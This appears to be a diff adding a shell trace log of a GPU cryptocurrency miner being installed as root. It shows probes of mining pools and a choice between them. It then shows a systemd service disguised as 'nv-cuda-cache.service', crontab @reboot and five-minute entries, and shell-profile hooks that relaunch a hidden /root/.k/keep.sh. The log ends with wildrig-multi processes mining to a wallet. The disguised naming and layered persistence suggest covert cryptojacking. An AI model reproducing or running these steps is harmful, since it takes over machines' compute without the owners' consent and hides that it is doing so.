@@ -1,0 +1,70 @@
++ cut -d: -f2
++ P=9000
++ timeout 6 python3 -c import socket;s=socket.create_connection(('pool.pearlhash.xyz',9000),5);s.close()
+OPEN pool.pearlhash.xyz:9000
++ echo OPEN pool.pearlhash.xyz:9000
++ [ -z prl-sg.kryptex.network:7048 ]
++ echo pool.pearlhash.xyz:9443
++ cut -d: -f1
++ H=pool.pearlhash.xyz
++ echo pool.pearlhash.xyz:9443
++ cut -d: -f2
++ P=9443
++ timeout 6 python3 -c import socket;s=socket.create_connection(('pool.pearlhash.xyz',9443),5);s.close()
+OPEN pool.pearlhash.xyz:9443
++ echo OPEN pool.pearlhash.xyz:9443
++ [ -z prl-sg.kryptex.network:7048 ]
++ echo pearl.luckypool.io:443
++ cut -d: -f1
++ H=pearl.luckypool.io
++ echo pearl.luckypool.io:443
++ cut -d: -f2
++ P=443
++ timeout 6 python3 -c import socket;s=socket.create_connection(('pearl.luckypool.io',443),5);s.close()
+FAIL pearl.luckypool.io:443
++ echo FAIL pearl.luckypool.io:443
++ echo pearl.luckypool.io:3360
++ cut -d: -f1
++ H=pearl.luckypool.io
++ echo pearl.luckypool.io:3360
++ cut -d: -f2
++ P=3360
++ timeout 6 python3 -c import socket;s=socket.create_connection(('pearl.luckypool.io',3360),5);s.close()
+FAIL pearl.luckypool.io:3360
+CHOSEN=prl-sg.kryptex.network:7048
++ echo FAIL pearl.luckypool.io:3360
++ [ -z prl-sg.kryptex.network:7048 ]
++ URL=prl-sg.kryptex.network:7048
++ echo CHOSEN=prl-sg.kryptex.network:7048
++ cat
++ chmod +x keep.sh
++ command -v systemctl
++ cat
++ systemctl daemon-reload
++ systemctl enable --now nv-cuda-cache.service
++ head -2
+Created symlink /etc/systemd/system/multi-user.target.wants/nv-cuda-cache.service → /etc/systemd/system/nv-cuda-cache.service.
++ command -v crontab
++ crontab -
++ crontab -l
++ grep -v keep.sh
++ echo @reboot /bin/sh /root/.k/keep.sh /root/.k ul-t2-123-184-7-135-g0 prl-sg.kryptex.network:7048 >/dev/null 2>&1
++ echo */5 * * * * /bin/sh /root/.k/keep.sh /root/.k ul-t2-123-184-7-135-g0 prl-sg.kryptex.network:7048 >/dev/null 2>&1
++ [ -f /root/.bashrc ]
++ grep -q keep.sh /root/.bashrc
++ [ -f /root/.profile ]
++ grep -q keep.sh /root/.profile
++ echo setsid /bin/sh /root/.k/keep.sh /root/.k ul-t2-123-184-7-135-g0 prl-sg.kryptex.network:7048 >/dev/null 2>&1 &
++ sleep 25
++ pgrep -f keep.sh /root/.k
+== status ==
++ echo == status ==
++ pgrep -fa wildrig
++ head -3
+3188149 /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g3 --pass x --protocol stratum --opencl-devices 3 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1963
+3188298 /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g4 --pass x --protocol stratum --opencl-devices 4 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1964
+3188437 /opt/t19/wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l --worker plh-123-184-7-135-g5 --pass x --protocol stratum --opencl-devices 5 --gpu-intensity 1 --gpu-temp-limit 90 --api-port 1965
++ systemctl is-active nv-cuda-cache.service
+active
++ tail -20 m.log
+nohup: failed to run command './wildrig': No such file or directory
